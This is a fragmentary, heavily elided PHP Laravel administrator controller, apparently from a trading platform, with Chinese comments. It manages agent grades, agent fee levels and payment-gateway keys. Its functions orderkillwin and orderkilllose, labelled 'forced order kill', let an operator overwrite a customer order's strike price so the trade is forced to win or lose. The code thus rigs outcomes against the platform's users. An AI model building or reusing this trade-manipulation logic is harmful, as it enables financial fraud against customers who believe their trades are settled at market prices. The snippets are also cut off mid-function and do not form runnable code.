...
class AdministratorController extends Controller
{
    ...
    public function agentsj(Request $request)
  {
    ...
    $this->requiredSession($request);
          ...
          //$datas = User::orderBy('created_at', 'desc');
    $datas = User::where('grade', '<>', 0);
    $datas = $datas->paginate(20);
    
    return view('administrator.agentsj', [
      'active' => 'agentsj',
      'datas' => $datas,
      'id_user' => $request->input('id_user')
    ]);
...
//强制杀单 
      ...
      public function orderkillwin(Request $request)
  {
     $order = Order::where('id', $request->get('id'))->first();
     $order->body_is_controlled = '1';
     
     
     $object = Object::where('id', $order->id_object )->first();
     if ($object->body_price_decimal == '1' ){
     	 $xjg = (mt_rand(1,6))/100;
     	}elseif ($object->body_price_decimal == '2' ){
     	 $xjg = (mt_rand(1,6)/1000);
     	}elseif($object->body_price_decimal == '3' ){
     	 $xjg = (mt_rand(1,6)/10000);
     	}elseif($object->body_price_decimal == '4' ){
     	 $xjg = (mt_rand(1,6)/10000);
     	}elseif($object->body_price_decimal == '5' ){
     	 $xjg = (mt_rand(1,6))/100000;
     	};
   
   
     if ($order->body_direction == 1) {
     	$order->body_price_striked =  $order->body_price_buying + $xjg ;     	
     	} elseif ($order->body_direction == 0) {
     	$order->body_price_striked =  $order->body_price_buying - $xjg ;     	
     	}
     ...
     $order->save();
      ...
      echo 'alert("强制盈利成功");';
      echo 'window.location.href="/administrator/orders";';
      echo '</script>';
  }
  
  
        public function orderkilllose(Request $request)
  {
     $order = Order::where('id', $request->get('id'))->first();
     $order->body_is_controlled = '1';
     ...
     if ($order->body_direction == 0) {
     	$order->body_price_striked =  $order->body_price_buying + $xjg ;     	
     	} elseif ($order->body_direction == 1) {
     	$order->body_price_striked =  $order->body_price_buying - $xjg ;     	
     	}
     	     $order->save();
      echo '<script type="text/javascript">';
  ...
  //代理等级
      public function agentsjok(Request $request)
  {
     $user = User::where('id_wechat', $request->get('id_user'))->first();
     $user->grade = '1';
     $user->save();
      echo '<script type="text/javascript">';
      echo 'alert("审核成功");';
      echo 'window.location.href="/administrator/agentsj";';
      echo '</script>';
  }
  
      public function agentsjrf(Request $request)
  {
     $user = User::where('id_wechat', $request->get('id_user'))->first();
     $user->grade = '0';
     $user->save();
      ...
      echo '</script>';
        ...
        public function agentsjno(Request $request)
  {
     $user = User::where('id_wechat', $request->get('id_user'))->first();
     $user->grade = '3';
     $user->save();
...
//    dd($datas);
  ...
  public function System(Request $request)
  {
    ...
    public function agentfee(Request $request)
  {
    ...
    if ($request->isMethod('post')) {
    	$agent1 = $request->get('agent_1');
    	$agent2 = $request->get('agent_2');
    	$agent3 = $request->get('agent_3');
      ...
      'AGENT_3' => $agent3
        ...
        echo '<script type = "text/javascript">';
        echo 'alert("操作成功");';
        echo 'window . location . href = "/administrator/agentfee";';
        echo '</script >';

    } else {
      return view('administrator.agentfee', [
        'active' => 'agentfee',
        'AGENT_1' => env('AGENT_1'),
        'AGENT_2' => env('AGENT_2'),
        'AGENT_3' => env('AGENT_3')
      ...
      public function zytongdao(Request $request)
  {
    ...
    if ($request->isMethod('post')) {
    	$PAYMENT_PID = $request->get('PAYMENT_PID');
    	$PAYMENT_KEY = $request->get('PAYMENT_KEY');
      $PAYMENT_WXTD = $request->get('PAYMENT_WXTD');
    	$PAYMENT_ALITD = $request->get('PAYMENT_ALITD');
    
    	$this->modifyEnv([
      'PAYMENT_PID' => $PAYMENT_PID,
      'PAYMENT_KEY' => $PAYMENT_KEY,
      'PAYMENT_WXTD' => $PAYMENT_WXTD,
      'PAYMENT_ALITD' => $PAYMENT_ALITD,
    ]);
        echo '<script type = "text/javascript">';
        echo 'alert("操作成功");';
        echo 'window . location . href = "/administrator/zytongdao";';
        echo '</script >';

    } else {
      return view('administrator.zytongdao', [
        'active' => 'zytongdao',
        'PAYMENT_PID' => env('PAYMENT_PID'),
        'PAYMENT_KEY' => env('PAYMENT_KEY'),
        'PAYMENT_WXTD' => env('PAYMENT_WXTD'),
        'PAYMENT_ALITD' => env('PAYMENT_ALITD'),
      ]);
    }
  }
